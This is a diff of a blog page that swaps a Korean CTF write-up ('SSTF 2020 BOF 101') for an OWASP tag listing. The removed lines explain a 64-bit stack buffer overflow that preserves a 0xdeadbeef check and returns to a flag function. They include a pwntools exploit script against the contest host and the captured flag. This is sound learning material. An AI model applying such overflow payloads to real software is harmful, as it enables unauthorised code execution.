@@ -5,8 +5,10 @@
   <!-- SEO相关 -->
   
     
+      <meta name="robots" content="index,follow">
+    
   
-  <link rel="canonical" href="https://blog.jhyeon.dev/2020/08/18/sstf-200818/"/>
+  <link rel="canonical" href="https://blog.jhyeon.dev/tags/owasp/"/>
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
   <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
@@ -24,9 +26,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>SSTF 2020 BOF 101 Write up - JHYEON BLOG</title>
-  
-    <meta name="keywords" content="Pwnable,BOF">
+  <title>Tag: OWASP - JHYEON BLOG</title>
   
 
   
@@ -295,7 +295,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post dock' style="display: none;">
+        <div id="full" class='cover-wrapper  dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
@@ -328,210 +328,81 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper" id="pjax-container">
           
 
+
 <div class='l_main'>
-  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
-
-
-  
-  <div class="article-meta" id="top">
     
-    
-    
-      <h1 class="title">
-        SSTF 2020 BOF 101 Write up
-      </h1>
-      <div class='new-meta-box'>
-        
-          
-            
-<div class='new-meta-item author'>
-  <a class='author' href="/" rel="nofollow">
-    <img no-lazy src="/img/header/cat.jpeg">
-    <p>jhyeon</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  <div class='new-meta-item category'>
-    <a class='notlink'>
-      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
-      <a class="category-link" href="/categories/CTF/">CTF</a>
-    </a>
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>Date : Aug 18, 2020</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  <div class="new-meta-item browse leancloud">
-    <a class='notlink'>
       
-      <div id="lc-pv" data-title="SSTF 2020 BOF 101 Write up" data-path="/2020/08/18/sstf-200818/">
-        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
-        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
-        View
-      </div>
-    </a>
-  </div>
-
-
+  <section class="post-list">
+    
+      
+        
           
+        
+      
+    
+    
+      
+        
+          <div class='post-wrapper'>
+            <div class="post post-v3 white-box reveal shadow">
+  
+  
+  
+  
+    
+    <h2 class="article-title" >
+      <a href="/2021/01/20/owasp2021-210120/">
+        OWASP TOP 10 2021 제안 자료
+      </a>
+    </h2>
+  
+  <div class='md'>
+    
+      
+        4년마다 OWASP 에서는 웹 애플리케이션에서 발생한 주요 취약점 리스트(top 10/category) 정보를 주는데,
+올해에도 제안 자료가 있어서 링크를 남겨본다. (공식 정보는 아닙니당)
+https://lab.wallarm.com/owasp-top-10-2021-proposal-based-on-a-statistical-data/?amp&amp;fb...
+      
+    
+  </div>
+  
+    <div class='meta-v3' line_style='solid'>
+      <div>
+        
+          
+          <a class='avatar' href='/'><img src='/img/header/cat.jpeg'></a>
+        
+        <time>2021-01-20</time>
+        
+          <span class="dot"></span>
+          <a class="category-link" href="/categories/Web/">Web</a>
         
       </div>
-    
-  </div>
-
-
-  
-  
-  <p>우선 file 명령어와 checksec을 사용해서 바이너리 컴파일 정보와, Memory Mitigation을 확인 해보자.</p>
-<p>사진과 같이 x64 dynamic linked binary임을 알 수 있고, FULL RELRO, NX, PIE가 활성화 되어 있는 것을 알 수 있다.</p>
-<p>IDA로 바이너리 분석을 해보면 main() 함수의 동작 로직은 다음과 같다.</p>
-<p>바이너리가 실행되면 scanf 함수를 통해 사용자에게 입력받는 로직이고, 0xdeadbeef 값을 세팅하고 있어</p>
-<p>BOF를 통해 해당 메모리 영역을 덮어버리면 BOF Detected!! 가 발생한다.</p>
-<p>그럼 시나리오는 다음과 같이 생각해볼 수 있다.</p>
-<p>입력 받는 메모리 공간은 rbp-0x90(144) 만큼을 받고 있으니, 140만큼 써주고 체크 로직을 통과하기 위해 나머지 4byte 값을 0xdeadbeef 로 만들어 준다음,</p>
-<p>RSP를 8byte dummy로 채우고 RET 에서 printflag() 함수로 리턴 시켜준다면 플래그를 획득할 수 있는 구조가 된다.</p>
-<p>32비트 환경에서 컴파일 된 바이너리는 SFP(4byte) + RET(4byte)를 가지지만,</p>
-<p>64비트 환경에서 컴파일 된 바이너리는 RSP(8byte) + RET(6byte)의 값을 가지는 것을 고려해주면 된다.</p>
-<pre><code class="py"> 1 #!/usr/bin/python3
- 2 
- 3 from pwn import *
- 4 
- 5 #p = process(&#39;./bof101&#39;)
- 6 
- 7 p = remote(&#39;bof101.sstf.site&#39;,1337)
- 8 
- 9 e = ELF(&#39;./bof101&#39;)
-10 
-11 p.recvuntil(&#39;addr:&#39;)
-12 
-13 flag_addr = int(p.recv(15),16)
-14 
-15 p.recvline()
-16 
-17 print(hex(flag_addr))
-18 
-19 payload = &quot;A&quot;*140
-20 payload += p32(0xdeadbeef)
-21 payload += &quot;A&quot;*8
-22 payload += p64(flag_addr)
-23 
-24 p.sendlineafter(&#39;: &#39;,payload)
-25 
-26 p.interactive()</code></pre>
-<p><code> SCTF&#123;n0w_U_R_B0F_3xpEr7&#125; </code></p>
-
-  
-  
-    
-    <div class='footer'>
       
-      
-        
-  <div class="related_posts">
-    <section class='header'>
-      <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
-    </section>
-    <section class='body'>
-      <div class="vlts-rps"><a class="item" href="/2020/11/21/bob-bisc-201129/" title="BISC CTF 2020(oldschool) write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">BISC CTF 2020(oldschool) write up</span></a><a class="item" href="/2020/09/14/csawctf-200914/" title="CSAW CTF 2020 roppity Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">CSAW CTF 2020 roppity Write up</span></a><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">angstorm ctf 2020 Write up</span></a></div></section></div>
-      
-      
+        <div>
+          <a class='readmore' href='/2021/01/20/owasp2021-210120/'>
+            Read More
+          </a>
+        </div>
       
     </div>
   
-  
-    
 
-
-  <div class='article-meta' id="bottom">
-    <div class='new-meta-box'>
-      
-        
-          <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>Date : Aug 18, 2020</p>
-  </a>
 </div>
 
+          </div>
         
       
-        
-          
-  
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Pwnable/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Pwnable</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/BOF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>BOF</p></a></div>
-
-
-        
-      
-        
-      
-    </div>
-  </div>
-
-
-  
-  
-
-  
-    <div class="prev-next">
-      
-        <a class='prev' href='/2020/09/10/search-algorithm-200910/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>탐색 알고리즘(선형, 이진) 정리</p>
-          <p class='content'>탐색 알고리즘 종류1. 선형 탐색법 (리니어 서치)
-왼쪽부터 순서대로 하나씩 확인해 나가는 방법
-
-(한쪽 끝에서 다른 한쪽 끝으로 나아가는 방법)
-
-탐색 시작 → 결과를 탐색...</p>
-        </a>
-      
-      
-        <a class='next' href='/2020/06/27/canvas-install-200627/'>
-          <p class='title'>canvas lms installation<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>OSOS : Ubuntu 16.04 Desktop(http://old-releases.ubuntu.com/releases/16.04.4/)
-Canvas LMS - Open S...</p>
-        </a>
-      
-    </div>
-  
-</article>
-
-
-  
-
-  <article class="post white-box reveal shadow" id="comments">
-    <p ct><i class='fas fa-comments'></i> Comments</p>
     
-    <div id="disqus_thread">
-  <div id="notShowDisqus" style="display: none;text-align: center;"><i class='fas fa-exclamation-triangle'></i>&nbsp;Unable to load Disqus, please make sure your network can access.</div>
-  <div id="load-btns"><a class="load-comments" onclick="needLoadDisqus()">Load Disqus</a></div>
-  <div id="loading-comments" style="display: none"><i class="fa fa-cog fa-spin fa-fw fa-2x"></i><br>Checking if Disqus is accessible...</div>
-</div>
-
-  </article>
+  </section>
+  
+    
+  
 
 
-
-
-
-
+    
+  
 </div>
 <aside class='l_side'>
   
@@ -539,7 +410,127 @@ Canvas LMS - Open S...</p>
     
     
 
+<section class="widget blogger shadow desktop mobile">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box rectangle' target="_blank" rel="noopener" href='https://pf.jhyeon.dev'>
+          <img no-lazy src='/img/profile/my.jpeg'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>JHYEON</h2>
+        
+        
+          <p>Web Development &amp; Security Research</p>
 
+        
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="mailto:stjhyeon@kakao.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/jhye0n"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+  
+
+  
+    
+    
+  
+
+  <section class="widget category shadow desktop">
+    
+  <header>
+    
+      <a href='/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>Categories</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      <ul class="entry navigation">
+        
+          <li><a class="flat-box"
+            title="/categories/CTF/" href="/categories/CTF/"
+            id="categoriesCTF"
+            ><div class='name'>CTF</div><div class='badge'>(9)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/Docx/" href="/categories/Docx/"
+            id="categoriesDocx"
+            ><div class='name'>Docx</div><div class='badge'>(17)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/Memo/" href="/categories/Memo/"
+            id="categoriesMemo"
+            ><div class='name'>Memo</div><div class='badge'>(7)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/Pwnable/" href="/categories/Pwnable/"
+            id="categoriesPwnable"
+            ><div class='name'>Pwnable</div><div class='badge'>(3)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/Wargame/" href="/categories/Wargame/"
+            id="categoriesWargame"
+            ><div class='name'>Wargame</div><div class='badge'>(3)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/Web/" href="/categories/Web/"
+            id="categoriesWeb"
+            ><div class='name'>Web</div><div class='badge'>(7)</div></a></li>
+        
+      </ul>
+    </div>
+  </section>
+
+
+  
+
+  
+    
+    
+  
+
+  <section class="widget tagcloud shadow desktop mobile">
+    
+  <header>
+    
+      <a href='/tags'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>Tags</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      <a href="/tags/Algorithm/" style="font-size: 16.5px; color: #888">Algorithm</a> <a href="/tags/B-ngsiri/" style="font-size: 14px; color: #999">B@ngsiri</a> <a href="/tags/BISC2020/" style="font-size: 14px; color: #999">BISC2020</a> <a href="/tags/BOF/" style="font-size: 14px; color: #999">BOF</a> <a href="/tags/Backup/" style="font-size: 14px; color: #999">Backup</a> <a href="/tags/Big-Sur/" style="font-size: 14px; color: #999">Big Sur</a> <a href="/tags/BoB/" style="font-size: 14px; color: #999">BoB</a> <a href="/tags/Browser-Auditor/" style="font-size: 14px; color: #999">Browser Auditor</a> <a href="/tags/C/" style="font-size: 14px; color: #999">C++</a> <a href="/tags/CANVAS/" style="font-size: 14px; color: #999">CANVAS</a> <a href="/tags/CSAWCTF-2020/" style="font-size: 14px; color: #999">CSAWCTF 2020</a> <a href="/tags/CSRF/" style="font-size: 14px; color: #999">CSRF</a> <a href="/tags/Canary/" style="font-size: 14px; color: #999">Canary</a> <a href="/tags/Cassandra/" style="font-size: 14px; color: #999">Cassandra</a> <a href="/tags/CheatSheet/" style="font-size: 14px; color: #999">CheatSheet</a> <a href="/tags/ChristmasCTF2019/" style="font-size: 14px; color: #999">ChristmasCTF2019</a> <a href="/tags/Chrome/" style="font-size: 14px; color: #999">Chrome</a> <a href="/tags/DB/" style="font-size: 14px; color: #999">DB</a> <a href="/tags/DVWA/" style="font-size: 14px; color: #999">DVWA</a> <a href="/tags/Development/" style="font-size: 14px; color: #999">Development</a> <a href="/tags/Docker/" style="font-size: 19px; color: #777">Docker</a> <a href="/tags/Dockerfile/" style="font-size: 16.5px; color: #888">Dockerfile</a> <a href="/tags/Exploitation/" style="font-size: 14px; color: #999">Exploitation</a> <a href="/tags/Firefox/" style="font-size: 14px; color: #999">Firefox</a> <a href="/tags/Foreign-Key/" style="font-size: 14px; color: #999">Foreign Key</a> <a href="/tags/JWT/" style="font-size: 14px; color: #999">JWT</a> <a href="/tags/LMS/" style="font-size: 14px; color: #999">LMS</a> <a href="/tags/Linux/" style="font-size: 16.5px; color: #888">Linux</a> <a href="/tags/Mac-OS/" style="font-size: 14px; color: #999">Mac OS</a> <a href="/tags/Macro/" style="font-size: 14px; color: #999">Macro</a> <a href="/tags/Malware/" style="font-size: 14px; color: #999">Malware</a> <a href="/tags/Memory-Mitigation/" style="font-size: 14px; color: #999">Memory Mitigation</a> <a href="/tags/Mprotect/" style="font-size: 14px; color: #999">Mprotect</a> <a href="/tags/Network/" style="font-size: 14px; color: #999">Network</a> <a href="/tags/NoSQL/" style="font-size: 14px; color: #999">NoSQL</a> <a href="/tags/OS/" style="font-size: 14px; color: #999">OS</a> <a href="/tags/OWASP/" style="font-size: 14px; color: #999">OWASP</a> <a href="/tags/PHP/" style="font-size: 16.5px; color: #888">PHP</a> <a href="/tags/POX2020/" style="font-size: 14px; color: #999">POX2020</a> <a href="/tags/Pentesting/" style="font-size: 14px; color: #999">Pentesting</a> <a href="/tags/PicoCTF2019/" style="font-size: 14px; color: #999">PicoCTF2019</a> <a href="/tags/Primary-Key/" style="font-size: 14px; color: #999">Primary Key</a> <a href="/tags/Pwn/" style="font-size: 14px; color: #999">Pwn</a> <a href="/tags/Pwnable/" style="font-size: 21.5px; color: #666">Pwnable</a> <a href="/tags/Python/" style="font-size: 14px; color: #999">Python</a> <a href="/tags/RCE/" style="font-size: 14px; color: #999">RCE</a> <a href="/tags/ROP/" style="font-size: 19px; color: #777">ROP</a> <a href="/tags/STL/" style="font-size: 14px; color: #999">STL</a> <a href="/tags/Shellcode/" style="font-size: 14px; color: #999">Shellcode</a> <a href="/tags/Suricata/" style="font-size: 14px; color: #999">Suricata</a> <a href="/tags/System/" style="font-size: 14px; color: #999">System</a> <a href="/tags/Tools/" style="font-size: 14px; color: #999">Tools</a> <a href="/tags/Ubuntu/" style="font-size: 14px; color: #999">Ubuntu</a> <a href="/tags/Wargame/" style="font-size: 14px; color: #999">Wargame</a> <a href="/tags/Web/" style="font-size: 24px; color: #555">Web</a> <a href="/tags/Web-Hacking/" style="font-size: 14px; color: #999">Web Hacking</a> <a href="/tags/Writeup/" style="font-size: 19px; color: #777">Writeup</a> <a href="/tags/XSS/" style="font-size: 19px; color: #777">XSS</a> <a href="/tags/iftop/" style="font-size: 14px; color: #999">iftop</a> <a href="/tags/syscall/" style="font-size: 14px; color: #999">syscall</a> <a href="/tags/websec-fr/" style="font-size: 16.5px; color: #888">websec.fr</a> <a href="/tags/%EC%84%A0%ED%98%95-%ED%83%90%EC%83%89/" style="font-size: 14px; color: #999">선형 탐색</a> <a href="/tags/%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89/" style="font-size: 14px; color: #999">이진 탐색</a> <a href="/tags/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/" style="font-size: 14px; color: #999">정보보안</a> <a href="/tags/%EC%B5%9C%EC%8B%A0%EB%8F%99%ED%96%A5/" style="font-size: 14px; color: #999">최신동향</a> <a href="/tags/%ED%9A%8C%EA%B3%A0/" style="font-size: 14px; color: #999">회고</a>
+    </div>
+  </section>
 
 
   
@@ -548,15 +539,14 @@ Canvas LMS - Open S...</p>
 </aside>
 
 
-
 		  
 		  <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <script>
   window.pdata={}
-  pdata.ispage=true;
-  pdata.postTitle="SSTF 2020 BOF 101 Write up";
+  pdata.ispage=false;
+  pdata.postTitle="";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
